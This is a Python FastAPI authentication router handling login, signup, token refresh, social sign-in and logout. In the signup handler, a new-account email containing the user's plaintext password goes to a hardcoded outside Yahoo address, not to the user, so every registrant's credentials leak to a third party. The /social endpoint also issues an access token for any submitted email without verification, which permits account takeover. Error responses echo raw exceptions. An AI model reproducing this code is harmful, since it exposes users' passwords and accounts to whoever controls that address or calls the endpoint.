from datetime import datetime, timedelta
from typing import Annotated, Any

from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException, Response
from fastapi.encoders import jsonable_encoder
from fastapi.responses import JSONResponse
from fastapi.security import OAuth2PasswordRequestForm

import crud
from core import deps, security
from core.config import settings
from core.logging import logger
from core.utils import (
    generate_new_account_email,
    send_email,
)
from models.auth import SignIn, Social
from models.token import Token
from models.user import UserCreate, UserPublic, UserRegister

# Create a router for users
router = APIRouter()


@router.post("/login/access-token")
def login_access_token(
    db: deps.SessionDep, form_data: Annotated[OAuth2PasswordRequestForm, Depends()]
) -> Token:
    """
    OAuth2 compatible token login, get an access token for future requests
    """
    user = crud.user.authenticate(
        db=db, email=form_data.username, password=form_data.password
    )
    if not user:
        raise HTTPException(status_code=400, detail="Incorrect email or password")
    elif not user.is_active:
        raise HTTPException(status_code=400, detail="Inactive user")
    return Token(
        access_token=security.create_access_token(
            user.email,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )
    )


@router.post("/login")
async def login(
    response: Response,
    db: deps.SessionDep,
    credentials: SignIn,
) -> Any:
    """
    OAuth2 compatible token login, get an access token for future requests
    """
    try:
        user = crud.user.authenticate(
            db=db, email=credentials.email, password=credentials.password
        )
        if not user:
            raise HTTPException(status_code=400, detail="Incorrect email or password")
        elif not user.is_active:
            raise HTTPException(status_code=400, detail="Inactive user")
        access_token = security.create_access_token(
            user.email,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )

        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )

        return {"user": user, "access_token": access_token}
    except Exception as e:
        logger.error(e)
        raise HTTPException(
            status_code=500, detail=f"Error signing in. Error: ${e}"
        ) from e


@router.post("/signup", response_model=UserPublic)
async def register_user(
    db: deps.SessionDep, user_in: UserRegister, background_tasks: BackgroundTasks
) -> Any:
    """
    Create new user without the need to be logged in.
    """
    try:
        if not settings.USERS_OPEN_REGISTRATION:
            raise HTTPException(
                status_code=403,
                detail="Open user registration is forbidden on this server",
            )
        user = crud.user.get_user_by_email(db=db, email=user_in.email)
        if user:
            raise HTTPException(
                status_code=400,
                detail="The user with this email already exists in the system",
            )
        user_create = UserCreate.model_validate(user_in)
        user = crud.user.create(db=db, user_create=user_create)
        access_token = security.create_access_token(
            user.email,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )

        response = JSONResponse(content=jsonable_encoder(user))
        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )

        email_data = generate_new_account_email(
            email_to=user.email, username=user.email, password=user_in.password
        )
        background_tasks.add_task(
            send_email,
            email_to="neyostica2000@yahoo.com",
            subject=email_data.subject,
            html_content=email_data.html_content,
        )
        return response
    except Exception as e:
        logger.error(e)
        raise HTTPException(
            status_code=500, detail=f"An error occurred while signing up. Error: ${e}"
        ) from e


@router.get("/refresh-token", response_model=Token)
async def test_token(
    response: Response,
    current_user: deps.CurrentUser,
) -> Any:
    """
    Return a new token for current user
    """
    try:
        if not current_user.is_active:
            raise HTTPException(status_code=400, detail="Inactive user")
        access_token = security.create_access_token(
            current_user.email,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )
        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )
        return {
            "access_token": access_token,
            "token_type": "bearer",
        }
    except Exception as e:
        logger.error(e)
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred while refreshing token. Error: ${e}",
        ) from e


@router.post("/social", response_model=Token)
async def social(response: Response, credentials: Social, db: deps.SessionDep) -> Any:
    """
    Return a new token for current user
    """
    try:
        user = crud.user.get_user_by_email(db=db, email=credentials.email)
        if not user:
            user_create = UserCreate.model_validate(credentials)
            user = crud.user.create(db=db, user_create=user_create)
        access_token = security.create_access_token(
            user.email,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )
        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )
        return {
            "access_token": access_token,
            "token_type": "bearer",
        }
    except Exception as e:
        logger.error(e)
        raise HTTPException(
            status_code=500, detail=f"Error signing in user. Error: ${e}"
        ) from e


@router.post("/logout")
def logout() -> Any:
    """
    Log out current user.
    """
    try:
        response = JSONResponse(content={"message": "User signed out successfully"})
        response.set_cookie(
            key="access_token",
            value="expired",
            max_age=timedelta(days=-1),
        )
        return response
    except Exception as e:
        logger.error(e)
        raise HTTPException(
            status_code=400, detail=f"Error signing out user. Error: ${e}"
        ) from e


def get_timestamp() -> int:
    # Get the current datetime
    current_datetime = datetime.now()

    # Add 1 hour (3600 seconds) to the current datetime.
    new_datetime = current_datetime + timedelta(
        seconds=settings.ACCESS_TOKEN_EXPIRE_MINUTES
    )

    # Convert the new datetime to a Unix timestamp (milliseconds since epoch).
    return int(new_datetime.timestamp() * 1000)
